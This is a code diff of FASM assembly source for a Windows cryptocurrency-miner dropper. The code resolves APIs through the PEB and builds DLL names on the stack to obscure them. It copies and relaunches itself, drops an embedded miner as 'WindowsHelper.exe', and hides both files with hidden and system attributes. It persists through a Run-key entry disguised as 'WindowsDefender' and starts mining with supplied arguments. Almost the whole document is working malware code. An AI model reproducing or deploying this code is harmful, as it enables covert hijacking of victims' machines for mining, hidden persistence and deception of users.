@@ -25,71 +25,47 @@
 ; \ \_____\  \ \_____\  \ \_\ \_\  \ \____-  \ \_____\  \ \_\ \_\
 ;  \/_____/   \/_____/   \/_/\/_/   \/____/   \/_____/   \/_/ /_/
 
-
 format PE GUI 4.0
 entry start
+include 'MACRO/STRUCT.inc'
+
+struct FUNC
+        name rb 30
+        addr dd ?
+ends
 
 section '.b4db4b3' data readable writeable
         GetProcAddress dd ?
 
-        lLib db 'LoadLibraryA', 0
-        LoadLibrary dd ?
-
-        krnl db 'kernel32.dll', 0
         kernel32 dd ?
-        cpFile db 'CopyFileA', 0
-        CopyFile dd ?
+        kernelTable: 
+                FUNC 'LoadLibraryA', 0
+                FUNC 'GetModuleFileNameA', 0
+                FUNC 'GetCurrentProcess', 0
+                FUNC 'CopyFileA', 0
+                FUNC 'CreateFileA', 0
+                FUNC 'WriteFile', 0
+                FUNC 'CloseHandle', 0
+                FUNC 'SetFileAttributesA', 0
+                FUNC 'ExitProcess', 0
+        kernelTable.count = 9
 
-        gcProc db 'GetCurrentProcess', 0
-        GetCurrentProcess dd ?
+        psapi dd ?
+        psapiTable:
+                FUNC 'GetModuleBaseNameA', 0
+        psapiTable.count = 1
 
-        cFile db 'CreateFileA', 0
-        CreateFile dd ?
-
-        wFile db 'WriteFile', 0
-        WriteFile dd ?
-
-        cHandle db 'CloseHandle', 0
-        CloseHandle dd ?
-
-        gmfName db 'GetModuleFileNameA', 0
-        GetModuleFileName dd ?
-
-        sfAttr db 'SetFileAttributesA', 0
-        SetFileAttributes dd ?
-
-        eProc db 'ExitProcess', 0
-        ExitProcess dd ?
-
-
-        adv db 'advapi32.dll', 0
-        adv32 dd ?
-
-        roKey db 'RegOpenKeyA', 0
-        RegOpenKey dd ?
-
-        rsVal db 'RegSetValueExA', 0
-        RegSetValue dd ?
-
-        rcKey db 'RegCloseKey', 0
-        RegCloseKey dd ?
-
-
-        shell db 'shell32.dll', 0
         shell32 dd ?
+        shellTable:
+                FUNC 'ShellExecuteA', 0
+        shellTable.count = 1
 
-        sEx db 'ShellExecuteA', 0
-        ShellExecute dd ?
-
-
-        psapi db 'psapi.dll', 0
-        hpsapi dd ?
-
-        gmfnEx db 'GetModuleFileNameExA', 0
-        GetModuleFileNameEx dd ?
-
-        gmbName db 'GetModuleBaseNameA', 0
-        GetModuleBaseName dd ?
+        adv32 dd ?
+        advTable:
+                FUNC 'RegOpenKeyA', 0
+                FUNC 'RegSetValueExA', 0
+                FUNC 'RegCloseKey', 0
+        advTable.count = 3
 
         oper db 'open', 0 ; runas = administrator
         filename db 'WindowsHelper.exe', 0
@@ -98,7 +74,8 @@ section '.b4db4b3' data readable writeable
         autorun db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
         keyname db 'WindowsDefender', 0
 
-        param db 'your arguments for miner', 0
+        ; USER ENTER
+        param db 'argument for mining', 0
 
         hFile dd ?
         hKey dd ?
@@ -110,6 +87,222 @@ section '.b4db4b3' data readable writeable
         m_size = $ - miner
 
 section '.b4db4b3' code readable executable
+        start:  
+                call init
+;  ____________________________________________________________
+; |                                                            |
+; |                    KERNEL32 INIT                           |
+; |____________________________________________________________|
+                push kernelTable
+                push kernelTable.count
+                push [kernel32]
+                call initFunctions
+
+;  ____________________________________________________________
+; |                                                            |
+; |                    Load other libraries                    |
+; |____________________________________________________________|
+                push 0
+                push 'l000'
+                sub word[esp+0x1], '0'
+                push 'i.dl'
+                push 'psap'
+                push esp
+                call [kernelTable+FUNC.addr]
+                test eax, eax
+                jz exit
+
+                mov [psapi], eax
+
+                push 0
+                push 'dll0'
+                sub word[esp+0x3], '0'
+                push 'l32.'
+                push 'shel'
+                push esp
+                call [kernelTable+FUNC.addr]
+                test eax, eax
+                jz exit
+
+                mov [shell32], eax
+
+                push 0
+                push '.dll'
+                push 'pi32'
+                push 'adva'
+                push esp
+                call [kernelTable+FUNC.addr]
+                test eax, eax
+                jz exit
+
+                mov [adv32], eax
+;  ____________________________________________________________
+; |                                                            |
+; |                    Other libaries init                     |
+; |____________________________________________________________|
+                push psapiTable
+                push psapiTable.count
+                push [psapi]
+                call initFunctions
+
+                push shellTable
+                push shellTable.count
+                push [shell32]
+                call initFunctions
+
+                push advTable
+                push advTable.count
+                push [adv32]
+                call initFunctions
+;  ____________________________________________________________
+; |                                                            |
+; |                    Main code start                         |
+; |____________________________________________________________|
+
+                push 128
+                push mePath
+                push 0
+                call [kernelTable+1*sizeof.FUNC+FUNC.addr]
+
+                call [kernelTable+2*sizeof.FUNC+FUNC.addr]
+
+                push 128
+                push mePath2
+                push 0
+                push eax
+                call [psapiTable+FUNC.addr]
+
+                xor ecx, ecx
+        strcmp: inc ecx
+                lea eax, [mePath2+ecx]
+                lea ebx, [filename_loader+ecx]
+                mov byte al, [eax]
+                mov byte bl, [ebx]
+                cmp ecx, fn_loader_size
+                je succ_strcmp
+
+                cmp al, bl
+                jne err_strcmp
+                jmp strcmp
+        err_strcmp:
+;  ____________________________________________________________
+; |                                                            |
+; |             Drop in another file and run                   |
+; |____________________________________________________________|
+                push filename_loader
+                push mePath
+                call [kernelTable+3*sizeof.FUNC+FUNC.addr]
+
+                push 0
+                push 0
+                push 0
+                push filename_loader
+                push oper
+                push 0
+                call [shellTable+FUNC.addr]
+
+                push 0
+                call [kernelTable+4*sizeof.FUNC+FUNC.addr]
+                ret
+
+        succ_strcmp:
+;  ____________________________________________________________
+; |                                                            |
+; |                Runned by dropped file                      |
+; | Dropping miner, running him, registering yourself          |
+; |                                                in autorun  |
+; |____________________________________________________________|
+                push 0
+                push 0
+                push 1
+                push 0
+                push 0x00000002
+                push 0x40000000
+                push filename
+                call [kernelTable+4*sizeof.FUNC+FUNC.addr]
+                cmp dword[fs:0x34], 0x0
+                jne skipWrite
+
+                mov [hFile], eax
+
+                push 0
+                push 0
+                push m_size
+                push miner
+                push [hFile]
+                call [kernelTable+5*sizeof.FUNC+FUNC.addr]
+
+                push [hFile]
+                call [kernelTable+6*sizeof.FUNC+FUNC.addr]
+
+        skipWrite:
+                push 4 or 2
+                push filename
+                call [kernelTable+7*sizeof.FUNC+FUNC.addr]
+
+                push 4 or 2
+                push mePath
+                call [kernelTable+7*sizeof.FUNC+FUNC.addr]
+
+                push hKey
+                push autorun
+                push 0x80000001
+                call [advTable+FUNC.addr]
+
+                xor ecx, ecx
+        strlen: inc ecx
+                lea eax, [mePath+ecx]
+                mov byte al, [eax]
+                cmp al, 0
+                jne strlen
+
+                push ecx 
+                push mePath
+                push 0x1
+                push 0
+                push keyname
+                push [hKey]
+                call [advTable+1*sizeof.FUNC+FUNC.addr]
+
+                push [hKey]
+                call [advTable+2*sizeof.FUNC+FUNC.addr]
+
+                push 0
+                push 0
+                push param
+                push filename
+                push oper
+                push 0
+                call [shellTable+FUNC.addr]
+        exit:
+                push 0
+                call [kernelTable+8*sizeof.FUNC+FUNC.addr]
+                ret
+
+        initFunctions:
+                xor esi, esi
+        startInit:
+                cmp esi, [esp+8]
+                je functionsEndInit
+
+                mov ebx, [esp+12]
+                mov edx, esi
+                imul edx, sizeof.FUNC
+                add ebx, edx
+
+                mov eax, [esp+4]
+                push ebx
+                push eax
+                call [GetProcAddress]
+
+                mov [ebx+FUNC.addr], eax
+
+                inc esi
+                jmp startInit
+
+        functionsEndInit:
+                ret
+
         init:
                 mov edi, [fs:0x030]
                 mov edi, [edi + 0x00c]
@@ -150,214 +343,4 @@ section '.b4db4b3' code readable executable
                 add edx, edi
                 mov [GetProcAddress], edx
 
-
-                push lLib
-                push edi
-                call [GetProcAddress]
-                mov [LoadLibrary], eax
-
-                push adv
-                call [LoadLibrary]
-                mov [adv32], eax
-
-                push shell
-                call [LoadLibrary]
-                mov [shell32], eax
-
-                push psapi
-                call [LoadLibrary]
-                mov [hpsapi], eax
-
-
-
-
-                push cpFile
-                push edi
-                call [GetProcAddress]
-                mov [CopyFile], eax
-
-                push gcProc
-                push edi
-                call [GetProcAddress]
-                mov [GetCurrentProcess], eax
-
-                push cFile
-                push edi
-                call [GetProcAddress]
-                mov [CreateFile], eax
-
-
-                push wFile
-                push edi
-                call [GetProcAddress]
-                mov [WriteFile], eax
-
-                push cHandle
-                push edi
-                call [GetProcAddress]
-
-                push gmfName
-                push edi
-                call [GetProcAddress]
-                mov [GetModuleFileName], eax
-
-
-                push sfAttr
-                push edi
-                call [GetProcAddress]
-                mov [SetFileAttributes], eax
-
-                push eProc
-                push edi
-                call [GetProcAddress]
-                mov [ExitProcess], eax
-
-
-
-
-                push roKey
-                push [adv32]
-                call [GetProcAddress]
-                mov [RegOpenKey], eax
-
-
-                push rsVal
-                push [adv32]
-                call [GetProcAddress]
-                mov [RegSetValue], eax
-
-                push rcKey
-                push [adv32]
-                call [GetProcAddress]
-                mov [RegCloseKey], eax
-
-
-                push sEx
-                push [shell32]
-                call [GetProcAddress]
-                mov [ShellExecute], eax
-
-
-
-                push gmbName
-                push [hpsapi]
-                call [GetProcAddress]
-                mov [GetModuleBaseName], eax
-
-                push gmfnEx
-                push [hpsapi]
-                call [GetProcAddress]
-                mov [GetModuleFileNameEx], eax
-
-
-
-
-                ret
-
-        start:  call init
-                push 128
-                push mePath
-                push 0
-                call [GetModuleFileName]
-
-                call [GetCurrentProcess]
-
-                push 128
-                push mePath2
-                push 0
-                push eax
-                call [GetModuleBaseName]
-
-                xor ecx, ecx
-        strcmp: inc ecx
-                lea eax, [mePath2+ecx]
-                lea ebx, [filename_loader+ecx]
-                mov byte al, [eax]
-                mov byte bl, [ebx]
-                cmp ecx, fn_loader_size
-                je succ_strcmp
-
-                cmp al, bl
-                jne err_strcmp
-                jmp strcmp
-        err_strcmp:
-                push filename_loader
-                push mePath
-                call [CopyFile]
-
-                push 0
-                push 0
-                push 0
-                push filename_loader
-                push oper
-                push 0
-                call [ShellExecute]
-
-                push 0
-                call [ExitProcess]
-                ret
-
-        succ_strcmp:
-                push 0
-                push 0
-                push 1
-                push 0
-                push 0x00000002
-                push 0x40000000
-                push filename
-                call [CreateFile]
-                cmp dword[fs:0x34], 0x0
-                jne skipWrite
-
-                mov [hFile], eax
-
-                push 0
-                push 0
-                push m_size
-                push miner
-                push [hFile]
-                call [WriteFile]
-
-                push [hFile]
-                call [CloseHandle]
-
-        skipWrite:
-                push 4 or 2
-                push filename
-                call [SetFileAttributes]
-
-                push 4 or 2
-                push mePath
-                call [SetFileAttributes]
-
-                push hKey
-                push autorun
-                push 0x80000001
-                call [RegOpenKey]
-
-                xor ecx, ecx
-        strlen: inc ecx
-                lea eax, [mePath+ecx]
-                mov byte al, [eax]
-                cmp al, 0
-                jne strlen
-
-                push ecx
-                push mePath
-                push 0x00000001
-                push 0
-                push keyname
-                push [hKey]
-                call [RegSetValue]
-
-                push 0
-                push 0
-                push param
-                push filename
-                push oper
-                push 0
-                call [ShellExecute]
-        exit:
-                push 0
-                call [ExitProcess]
                 ret
